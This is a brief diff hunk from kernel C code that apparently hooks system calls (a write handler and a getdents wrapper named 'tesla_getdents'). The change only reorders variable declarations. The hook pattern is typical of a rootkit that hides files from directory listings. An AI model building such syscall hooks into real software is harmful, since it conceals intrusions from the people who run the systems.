@@ -43,11 +43,11 @@ asmlinkage long tesla_write(unsigned int fd, char __user *buf, size_t count)
 
 asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
-	int ret = orig_dents(fd, dirp, count);
+	int ret, i;
+	ret = orig_dents(fd, dirp, count);
     struct linux_dirent *p1 = kmalloc(ret, GFP_KERNEL);
 	struct linux_dirent *p2 = p1;
 
-	int i;
 	i = 0;
 
 	if (ret == 0) {
